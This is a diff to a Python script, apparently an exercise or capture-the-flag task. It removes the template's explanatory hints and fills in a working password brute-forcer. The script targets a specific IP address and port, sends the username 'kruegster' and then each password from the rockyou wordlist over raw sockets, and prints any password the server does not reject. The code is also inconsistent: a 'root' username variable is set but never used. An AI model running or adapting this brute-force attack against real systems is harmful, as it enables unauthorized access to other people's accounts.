@@ -26,37 +26,34 @@
 
 import socket
 
-host = "" # IP address here
-port = 0000 # Port here
+host = "142.93.117.193" # IP address here
+port = 1337 # Port here
 wordlist = "/usr/share/wordlists/rockyou.txt" # Point to wordlist file
+username = "root"   # Hint: use OSINT
+password = ""   # Hint: use wordlist
 
 def brute_force():
-    """
-        Sockets: https://docs.python.org/2/library/socket.html
-        How to use the socket s:
 
-            # Establish socket connection
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((host, port))
 
-            Reading:
+	with open(wordlist,'r') as passwords:
+		for line in passwords:
+			for password in line.split():
+				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+				s.connect((host, port))
+				data = s.recv(1024)     
+				print(data)             # Prints data
+				s.send(bytes("kruegster\n"))
+				data = s.recv(1024)     
+				print(data)             # Prints data
+				s.send(bytes(password +"\n"))
+				data = s.recv(1024);
+				if 'Fail' not in data:
+					print("\n\n" + "password" + password)
+				s.close()
 
-                data = s.recv(1024)     # Receives 1024 bytes from IP/Port
-                print(data)             # Prints data
 
-            Sending:
 
-                s.send("something to send\n")   # Send a newline \n at the end of your command
 
-        General idea:
-
-            Given that you know a potential username, use a wordlist and iterate
-            through each possible password and repeatedly attempt to login to
-            the Briong server.
-    """
-
-    username = ""   # Hint: use OSINT
-    password = ""   # Hint: use wordlist
 
 
 
